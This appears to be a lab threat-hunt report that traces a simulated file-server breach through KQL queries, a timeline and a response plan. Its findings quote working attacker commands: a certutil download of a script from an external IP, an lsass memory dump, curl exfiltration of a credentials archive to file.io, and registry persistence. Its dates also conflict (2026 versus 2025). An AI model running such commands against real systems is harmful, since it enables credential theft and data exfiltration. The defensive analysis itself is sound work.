<img width="1177" height="237" alt="image" src="https://github.com/user-attachments/assets/3c6611d0-7248-45ba-9973-41bb519bba92" />

# Threat Hunt Report: Unauthorized Data Transfer and Lateral Movement
Azuki Import/Export Trading

**SITUATION:**
Competitor undercut our 6-year shipping contract by exactly 3%. Our supplier contracts and pricing data appeared on underground forums.

**COMPANY:**
Azuki Import/Export Trading Co. - 23 employees, shipping logistics Japan/SE Asia

- [Scenario](https://www.notion.so/Memo-Azuki-Import-Export-Trading-2b0cf57416ff804f8d23ecac0d2b60e9)

## Platforms and Languages Leveraged
- Log Analytics Workspaces (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)

##  Scenario
After an attacker establised initial access on November 19th, network monitoring detected the attacker returning approximately 72 hours later. Suspicious lateral movement and large data transfers were observed overnight on the file server.

### High-Level TOR-Related IoC Discovery Plan

- **Check `DeviceFileEvents`** for any creation or modification of archives and dump files such as `.tar .gz .dmp` within hidden system directories such as `DeviceFileEvents`
- **Check `DeviceProcessEvents`** for any uses of native utilities like `certutil.exe regedit.exe curl.exe` being used to download scripts, modify registery keys, or exfiltrate data.
- **Check `DeviceFileEvents`** for any creation of unauthorized archives in hidden staging paths like `C:\Windows\Logs\CBS\`

---

## Discovery steps and findings

### 1. Searched the `DeviceLogonEvents` Table to find the source IP of the return connection and compromised file server

The source IP of the return connection is 159.26.106.98, as shown in the result logs. It is in the Remote IP field. The known breached account name is “kenji.sato”. Azuki was the given DeviceName field. The compromised file server is azuki-fileserver01. Although the logon failed, the bad actor still attempted to log into this.

**Query used to locate events:**

```kql
DeviceLogonEvents
| where DeviceName contains "azuki" 
| where AccountName == "kenji.sato"
| sort by TimeGenerated asc
| project TimeGenerated,DeviceName, AccountName, ActionType, RemoteIP
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/c962c06e-1361-42a4-8c6b-7e6449124ae8">

---

### 2. Searched the `DeviceLogonEvents` Table to find the compromised administrator account

The compromised administrator account is fileadmin as it was used to connect to the file server with suspicious activity.

**Query used to locate event:**

```kql
DeviceLogonEvents
| where ActionType == "LogonSuccess"
| where LogonType == "RemoteInteractive"
| where DeviceName == "azuki-fileserver01"
| project TimeGenerated,DeviceName, AccountName, ActionType, RemoteIP, InitiatingProcessCommandLine

```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/c4ec7409-50bd-49df-bf66-5a313e906a6c">

---

### 3. Searched the `DeviceProcessEvents` Table to find the command to enumerate local network shares and to enumerate remote shares

The command the attacker used is “net share” to enumerate the local network shares and used the command "net.exe" view \\10.1.0.188 to enumerate remote shares. I first queried the process command line to have any “share” in it to see what the attacker used for network shares on the file server. I found out they used “net.exe” so I searched for that in the process command line and found the local network share command and remote share enumeration command.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine has_any ("share")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/25c6da3b-3d77-4c9f-add7-a0ce06c3c064">

---

**Second query used to locate events:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine has_any ("net.exe")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| sort by TimeGenerated desc
```

<img width="1212" alt="image" src="https://github.com/user-attachments/assets/cd13ca91-7134-4788-ac31-da10990048f9">

---

### 4. Searched the `DeviceProcessEvents` Table to find the command to enumerate user privileges

The attacker used the command “whoami /all” to enumerate their user privileges which allowed them to understand what privileges they currently have and what they can and cannot do.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine contains "whoami"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/a20a2469-a73b-43fc-bad6-06c45dcb3fea">

---

### 5. Searched the `DeviceProcessEvents` Table to find the command to enumerate network configuration

The attacker used the command “ipconfig /all” to enumerate network configuration. This helped the attacker gain information about their target system.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine contains "ipconfig"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/b9209c61-93f5-49d9-a179-23145448ebd0">

---

### 6. Searched the `DeviceProcessEvents` Table to find the command used to hide the staging directory

The attacker used the command “attrib +h +s C:\Windows\Logs\CBS” to hide the staging directory which hides directories to evade discovery. The path of the directory is “C:\Windows\Logs\CBS”.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine contains "attrib"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/510e92e6-ff74-4743-bf53-36c278fcb7fb">

---

### 7. Searched the `DeviceProcessEvents` Table to find the command used to download the PowerShell script

The attacker used the command “"certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1” to retrieve a script and store it in the staging directory.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01" 
| where AccountName == "fileadmin"
| where ProcessCommandLine contains "C:\\Windows\\Logs\\CBS"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/16510f66-b796-4727-9b08-778d200ec68d">

---

### 8. Searched the `DeviceFileEvents` Table to find the credential file created in the staging directory

The attacker created a file named “IT-Admin-Passwords.csv” which had all the credential files and saved it in the staging directory.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01" 
| where FileName endswith "csv"
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/62f1355e-0b57-4f70-85fc-a4f4f86e1c87">

---

### 9. Searched the `DeviceFileEvents` Table to find the command used to stage data from a network share

The attacker used the command “xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y” to stage the data to from the network share so that they are less likely to trigger security alerts.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01" 
| where InitiatingProcessCommandLine contains "xcopy"
| where FileName == "IT-Admin-Passwords.csv"
| project TimeGenerated, DeviceName, FileName, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/dfa7a6d3-fce1-428f-91d7-4551bbade306">

---

### 10. Searched the `DeviceFileEvents` Table to find the command used to compress the staged collection data

The attacker compressed the data using a cross platform tool called “tar”. This is the command the attacker used “"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .”

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01" 
| where InitiatingProcessCommandLine contains ".tar"
| project TimeGenerated, FileName, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/f7bf9883-cda1-4487-8103-d72783bc2098">

---

### 11. Searched the `DeviceFileEvents` Table to find the renamed credential dumping tool

The attacker renamed a credential dumping tool to “pd.exe” as an inconspicuous file name to evade detection.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01" 
| where ActionType == "FileCreated"
| where FileName endswith ".exe"
| where FolderPath contains "C:\\Windows\\Logs\\CBS"
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/2fae398b-f148-4fdd-87f2-d7c919bda18b">

---

### 12. Searched the `DeviceFileEvents` Table to find the command used by attacker to dump process memory for credential extraction

The attacker used pd.exe to have a complete process memory dump using the command “"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp”

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01" 
| where InitiatingProcessCommandLine contains "pd.exe"
| project TimeGenerated, ActionType, DeviceName, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/94dbfab6-d100-42ad-a8f4-536976a477b3">

---

### 13. Searched the `DeviceNetworkEvents` Table to find the command used by attacker to exfiltrate the staged data

The attacker used an outbound HTTP request to upload the compressed archive to an external endpoint. This is the command used by the attacker "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io. The cloud service used was “file.io”.

**Query used to locate events:**

```kql
DeviceNetworkEvents
| where DeviceName == "azuki-fileserver01" 
| where InitiatingProcessCommandLine contains "curl"
| where RemotePort == "443"
| project TimeGenerated, DeviceName,RemotePort, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/6653ad22-343d-4a39-896c-384bf23f433a">

---

### 14. Searched the `DeviceRegistryEvents` Table to find the registry value name used to establish persistence

The attacker used the HKLM autostart key to affect all users on system start to establish persistence. The attacker named the persistence beacon filename to “svchost.ps1”.

**Query used to locate events:**

```kql
DeviceRegistryEvents
| where DeviceName == "azuki-fileserver01"
| where InitiatingProcessCommandLine contains "HKLM"
| project TimeGenerated, ActionType, DeviceName, RegistryValueName, InitiatingProcessCommandLine
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/2a7fe8c1-4e40-4f6e-8c83-ba7a45cac638">

---

### 15. Searched the `DeviceFileEvents` Table to find the powerShell history file deleted

Since the powershell saves the command history to persistent files that survive the session termination, the attacker deleted that file to evade detection.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where ActionType == "FileDeleted"
| where FileName contains "history"
| project TimeGenerated, ActionType, DeviceName, FileName
```
<img width="1212" alt="image" src="https://github.com/user-attachments/assets/f5883521-3500-4c0a-9dec-2a502e7d6b3f">

---

## Chronological Event Timeline 

- Incident Timeline: Data exfiltration on file server
- Date: November 22, 2026
- Device Name: azuki-fileserver01
- Account: fileadmin
- Time in UTC

## Phase 1: Initial Access & Discovery
  - 12:11 AM – 12:19 AM: The attacker successfully logs into the file server using the compromised fileadmin administrator account via a RemoteInteractive session.
  - 12:40 AM: The attacker begins system and user discovery using native Windows utilities:
    - whoami.exe: Executed to check current user privileges.
    - net.exe user: Executed to list local users.
    - net.exe localgroup administrators: Executed to identify members of the local administrators group.
    - net.exe share: Executed to enumerate local network shares.
    - 12:42 AM: Network and remote discovery continues:
    - net.exe view \10.1.0.188: Used to enumerate shares on a remote system.
    - ipconfig /all: Executed to gather detailed network configuration and target information.

## Phase 2: Staging & Tooling
  - 12:55 AM: The attacker prepares a staging directory at C:\Windows\Logs\CBS and uses attrib.exe +h +s to hide it from standard view and evade discovery.
  - 12:56 AM – 1:02 AM: certutil.exe is used multiple times to download external tools and scripts, specifically retrieving ex.ps1 from http://78.141.196.6:7331/.
  - 1:07 AM: The attacker uses xcopy.exe to move sensitive data from network shares into the hidden staging directory, creating the file IT-Admin-Passwords.csv.

## Phase 3: Persistence & Credential Access
  - 2:03 AM: A credential dumping tool is introduced to the staging directory and renamed to pd.exe (masquerading to evade detection).
  - 2:10 AM: Persistence is established by adding a registry value named FileShareSync to the HKLM autostart keys using reg.exe, pointing to a beacon script named svchost.ps1.
  - 2:24 AM: The attacker executes the renamed tool pd.exe (ProcDump) to create a full memory dump of the lsass.exe process (PID 876) for credential extraction.

## Phase 4: Exfiltration & Anti-Forensics
  - 2:25 AM: The attacker exfiltrates the collected data. curl.exe is used to upload credentials.tar.gz and the lsass.dmp file to the external cloud service file.io.
  - 2:26 AM: In a final attempt to cover their tracks, the attacker deletes the ConsoleHost_history.txt file to remove the record of their interactive PowerShell commands.

---

## Summary

On November 22, 2025, an attacker utilized the compromised fileadmin account to perform a remote interactive logon to azuki-fileserver01. Following initial discovery via native utilities like whoami, net share, and ipconfig , the actor established a hidden staging area at C:\Windows\Logs\CBS using the attrib command to evade detection. The attacker then used certutil.exe to download a malicious payload (ex.ps1) and xcopy.exe to aggregate sensitive data, including IT-Admin-Passwords.csv, into the hidden directory. To ensure long-term access, persistence was configured via an HKLM registry autostart key named FileShareSync , while credentials were harvested by using a renamed ProcDump tool (pd.exe) to dump the memory of the lsass.exe process. Finally, the staged data was compressed and exfiltrated to the external service file.io using curl.exe , after which the attacker deleted the ConsoleHost_history.txt file to erase their command-line trail.

---

## Recommended Response Plan

Immediately isolate the infected host and reset credentials for the fileadmin and kenji.sato accounts to terminate active sessions and prevent lateral movement. Conduct a forensic sweep to delete the malicious staging directory at C:\Windows\Logs\CBS, remove the FileShareSync registry persistence key, and block all connections to unknown endpoints. Block the abuse of native tools like certutil.exe and curl.exe for unauthorized web transfers to file-sharing sites.

---
